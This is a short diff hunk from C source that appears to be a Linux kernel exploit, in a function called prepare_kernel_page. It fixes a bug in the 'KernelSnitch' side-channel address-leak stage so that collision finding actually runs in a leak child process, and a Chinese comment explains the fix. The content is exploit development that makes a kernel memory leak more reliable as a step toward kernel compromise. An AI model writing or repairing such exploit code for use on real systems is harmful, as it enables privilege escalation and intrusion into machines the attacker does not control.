@@ -688,7 +688,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       if (alt_sz == (size_t)MM_STRUCT_SZ)
         continue;
       pr_info("KernelSnitch retry with MM_STRUCT_SZ=0x%zx\n", alt_sz);
-      ks = kernelsnitch_setup(alt_sz, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      ks = kernelsnitch_setup(alt_sz, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);
+      /* BUG FIX: setup 后必须调用 find_collisions（通过 clone_leak_child 子进程），
+         否则 state 永远是 INIT，found_collisions 必然返回 0 */
+      child_leak = clone_leak_child();
+      SYSCHK(waitpid(child_leak, NULL, 0));
       if (!kernelsnitch_found_collisions(ks)) {
         pr_warning("KernelSnitch collision finding failed (alt 0x%zx)\n", alt_sz);
         kernelsnitch_cleanup(ks);
